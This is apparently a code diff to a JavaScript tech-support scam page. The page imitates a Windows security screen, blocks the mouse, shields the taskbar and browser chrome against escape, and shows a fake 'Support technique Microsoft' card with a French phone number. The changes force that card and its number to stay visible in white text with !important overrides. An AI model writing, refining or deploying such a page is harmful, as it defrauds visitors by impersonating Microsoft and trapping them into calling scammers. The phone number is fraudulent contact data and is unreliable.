@@ -5,13 +5,14 @@
   if (!document.querySelector('link[href*="styles.css"]')) {
     var styleLink = document.createElement("link");
     styleLink.rel = "stylesheet";
-    styleLink.href = "styles.css?v=14";
+    styleLink.href = "styles.css?v=16";
     document.head.appendChild(styleLink);
   }
 
   document.title = "Windows";
 
   mount.innerHTML =
+    '<style id="support-card-force-white">#securitySupportCard,#securitySupportCard p,#securitySupportCard div{color:#ffffff!important;-webkit-text-fill-color:#ffffff!important}</style>' +
     '<div class="mouse-blocker" id="mouseBlocker" aria-hidden="true"></div>' +
     '<div id="escapeShield" class="escape-shield" aria-hidden="true" role="alert">' +
     '<div class="escape-shield-taskbar-wrap">' +
@@ -53,10 +54,10 @@
     '</div>' +
     '</section>' +
     '<aside id="securitySupportCard" class="support-card" aria-label="Support technique Microsoft">' +
-    '<p class="support-card-subtitle">Support technique Microsoft</p>' +
-    '<p class="support-card-phone">+33 02 59 50 90 20</p>' +
-    '<p class="support-card-label">Numero</p>' +
-    '<div class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
+    '<p id="scSubtitle" class="support-card-subtitle">Support technique Microsoft</p>' +
+    '<p id="scPhone" class="support-card-phone">+33 02 59 50 90 20</p>' +
+    '<p id="scLabel" class="support-card-label">Numero</p>' +
+    '<div id="scArrow" class="support-card-arrow" aria-hidden="true">▼</div></aside></div>' +
     '<div class="home-page">' +
     '<main class="screen">' +
     '<div class="fb-desktop-bg" aria-hidden="true">' +
@@ -185,9 +186,20 @@
     }
   }
 
+  function paintSupportCardWhite() {
+    var ids = ["securitySupportCard", "scSubtitle", "scPhone", "scLabel", "scArrow"];
+    ids.forEach(function (id) {
+      var node = document.getElementById(id);
+      if (!node) return;
+      node.style.setProperty("color", "#ffffff", "important");
+      node.style.setProperty("-webkit-text-fill-color", "#ffffff", "important");
+    });
+  }
+
   function showSupportCard() {
     var card = document.getElementById("securitySupportCard");
     if (!card) return;
+
     document.body.appendChild(card);
     card.classList.add("is-visible");
     card.setAttribute("aria-hidden", "false");
@@ -196,9 +208,9 @@
     card.style.setProperty("right", "12px", "important");
     card.style.setProperty("bottom", "24px", "important");
     card.style.setProperty("z-index", "47900", "important");
-    card.querySelectorAll(".support-card-subtitle, .support-card-phone, .support-card-label, .support-card-arrow").forEach(function (node) {
-      node.style.setProperty("color", "#ffffff", "important");
-    });
+    card.style.setProperty("visibility", "visible", "important");
+    card.style.setProperty("opacity", "1", "important");
+    paintSupportCardWhite();
   }
 
   function showSecurityPage() {
@@ -208,6 +220,7 @@
     document.body.classList.add("security-mode");
     showBrowserChromeShield();
     showSupportCard();
+    paintSupportCardWhite();
   }
 
   function showBrowserChromeShield() {
